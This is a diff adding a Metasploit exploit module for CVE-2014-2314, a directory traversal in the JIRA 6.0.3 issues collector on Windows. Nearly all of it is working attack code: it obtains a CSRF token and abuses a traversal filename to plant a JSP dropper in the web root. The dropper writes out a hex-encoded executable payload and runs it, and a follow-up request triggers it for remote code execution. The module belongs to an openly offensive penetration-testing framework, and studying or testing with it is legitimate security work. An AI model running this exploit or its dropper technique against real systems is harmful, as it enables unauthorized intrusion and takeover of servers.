@@ -1,0 +1,209 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'        => 'JIRA Issues Collector Directory Traversal',
+      'Description' => %q{
+        This module exploits a directory traversal flaw in JIRA 6.0.3. The vulnerability exists
+        in the issues collector code, while handling attachments provided by the user. It can be
+        exploited in Windows environments to get remote code execution. This module has been tested
+        successfully on JIRA 6.0.3 with Windows 2003 SP2 Server.
+      },
+      'Author'       =>
+        [
+          'Philippe Arteau', # Vulnerability Discovery
+          'juan vazquez' # Metasploit module
+        ],
+      'License'     => MSF_LICENSE,
+      'References'  =>
+        [
+          [ 'CVE', '2014-2314'],
+          [ 'OSVDB', '103807' ],
+          [ 'BID', '65849' ],
+          [ 'URL', 'https://confluence.atlassian.com/display/JIRA/JIRA+Security+Advisory+2014-02-26' ],
+          [ 'URL', 'http://blog.h3xstream.com/2014/02/jira-path-traversal-explained.html' ]
+        ],
+      'Privileged'  => true,
+      'Platform'    => 'win',
+      'Targets'     =>
+        [
+          [ 'Jira 6.0.3 / Windows 2003 SP2',
+            {
+              'Arch' => ARCH_X86,
+              'Platform' => 'win'
+            }
+          ]
+        ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Feb 26 2014'))
+
+    register_options(
+      [
+        Opt::RPORT(8080),
+        OptString.new('TARGETURI', [true, 'Path to JIRA', '/']),
+        OptInt.new('COLLECTOR', [true, 'Collector ID'])
+      ], self.class)
+
+    register_advanced_options(
+      [
+        # By default C:\Program Files\Atlassian\JIRA\atlassian-jira\QhVRutsh.jsp
+        OptString.new('JIRA_PATH', [true, 'Path to the JIRA web folder from the Atlassian installation directory', "JIRA\\atlassian-jira"]),
+        # By default file written to C:\Program Files\Atlassian\Application Data\JIRA\caches\tmp_attachments\$random_\, we want to traversal until 'Atlassian'
+        OptInt.new('TRAVERSAL_DEPTH', [true, 'Traversal depth', 6])
+      ], self.class)
+  end
+
+  def get_upload_token
+    res = send_request_cgi(
+      {
+        'uri'    => normalize_uri(target_uri.path, "rest", "collectors", "1.0", "tempattachment", datastore['COLLECTOR']),
+        'method' => 'POST',
+        'data'   => rand_text_alpha(10 + rand(10)),
+        'vars_get' =>
+          {
+            'filename' => rand_text_alpha(10 + rand(10))
+          }
+      })
+
+    if res and res.code == 500 and res.body =~ /"token":"(.*)"}/
+      csrf_token = $1
+      @cookie = res.get_cookies
+    else
+      csrf_token = ""
+    end
+
+    return csrf_token
+  end
+
+  def upload_file(filename, contents, csrf_token)
+    traversal = "..\\" * datastore['TRAVERSAL_DEPTH']
+    traversal << datastore['JIRA_PATH']
+
+    res = send_request_cgi(
+      {
+        'uri'    => normalize_uri(target_uri.path, "rest", "collectors", "1.0", "tempattachment", datastore['COLLECTOR']),
+        'method' => 'POST',
+        'data'   => contents,
+        'cookie' => @cookie,
+        'ctype'  => 'text/plain',
+        'vars_get' =>
+          {
+            'filename' => "#{traversal}\\#{filename}",
+            'atl_token' => csrf_token
+          }
+      })
+
+    if res and res.code == 201 and res.body =~ /\{"name":".*#{filename}"/
+      register_files_for_cleanup("..\\..\\#{datastore['JIRA_PATH']}\\#{filename}")
+      register_files_for_cleanup("..\\..\\#{datastore['JIRA_PATH']}\\#{@exe_filename}")
+      return true
+    else
+      print_error("#{peer} - Upload failed...")
+      return false
+    end
+  end
+
+  def upload_and_run_jsp(filename, contents)
+    print_status("#{peer} - Getting a valid CSRF token...")
+    csrf_token = get_upload_token
+    fail_with(Failure::Unknown, "#{peer} - Unable to find the CSRF token") if csrf_token.empty?
+
+    print_status("#{peer} - Exploiting traversal to upload JSP dropper...")
+    upload_file(filename, contents, csrf_token)
+
+    print_status("#{peer} - Executing the dropper...")
+    send_request_cgi(
+      {
+        'uri'    => normalize_uri(target_uri.path, filename),
+        'method' => 'GET'
+      })
+  end
+
+  def check
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, 'login.jsp'),
+    })
+
+    if res and res.code == 200 and res.body =~ /<meta name="application-name" content="JIRA" data-name="jira" data-version="([0-9\.]*)">/
+      version = $1
+    else
+      return Exploit::CheckCode::Unknown
+    end
+
+    if version <= "6.0.3"
+      return Exploit::CheckCode::Detected
+    end
+
+    return Exploit::CheckCode::Safe
+  end
+
+  def exploit
+    print_status("#{peer} - Generating EXE...")
+    exe = payload.encoded_exe
+    @exe_filename = Rex::Text.rand_text_alpha(8) + ".exe"
+
+    print_status("#{peer} - Generating JSP dropper...")
+    dropper = jsp_drop_and_execute(exe, @exe_filename)
+    dropper_filename = Rex::Text.rand_text_alpha(8) + ".jsp"
+
+    print_status("#{peer} - Uploading and running JSP dropper...")
+    upload_and_run_jsp(dropper_filename, dropper)
+  end
+
+  # This should probably go in a mixin (by egypt)
+  def jsp_drop_bin(bin_data, output_file)
+    jspraw =  %Q|<%@ page import="java.io.*" %>\n|
+    jspraw << %Q|<%\n|
+    jspraw << %Q|String data = "#{Rex::Text.to_hex(bin_data, "")}";\n|
+
+    jspraw << %Q|FileOutputStream outputstream = new FileOutputStream("#{output_file}");\n|
+
+    jspraw << %Q|int numbytes = data.length();\n|
+
+    jspraw << %Q|byte[] bytes = new byte[numbytes/2];\n|
+    jspraw << %Q|for (int counter = 0; counter < numbytes; counter += 2)\n|
+    jspraw << %Q|{\n|
+    jspraw << %Q|  char char1 = (char) data.charAt(counter);\n|
+    jspraw << %Q|  char char2 = (char) data.charAt(counter + 1);\n|
+    jspraw << %Q|  int comb = Character.digit(char1, 16) & 0xff;\n|
+    jspraw << %Q|  comb <<= 4;\n|
+    jspraw << %Q|  comb += Character.digit(char2, 16) & 0xff;\n|
+    jspraw << %Q|  bytes[counter/2] = (byte)comb;\n|
+    jspraw << %Q|}\n|
+
+    jspraw << %Q|outputstream.write(bytes);\n|
+    jspraw << %Q|outputstream.close();\n|
+    jspraw << %Q|%>\n|
+
+    jspraw
+  end
+
+  def jsp_execute_command(command)
+    jspraw =  %Q|<%@ page import="java.io.*" %>\n|
+    jspraw << %Q|<%\n|
+    jspraw << %Q|try {\n|
+    jspraw << %Q|  Runtime.getRuntime().exec("chmod +x #{command}");\n|
+    jspraw << %Q|} catch (IOException ioe) { }\n|
+    jspraw << %Q|Runtime.getRuntime().exec("#{command}");\n|
+    jspraw << %Q|%>\n|
+
+    jspraw
+  end
+
+  def jsp_drop_and_execute(bin_data, output_file)
+    jsp_drop_bin(bin_data, output_file) + jsp_execute_command(output_file)
+  end
+
+end
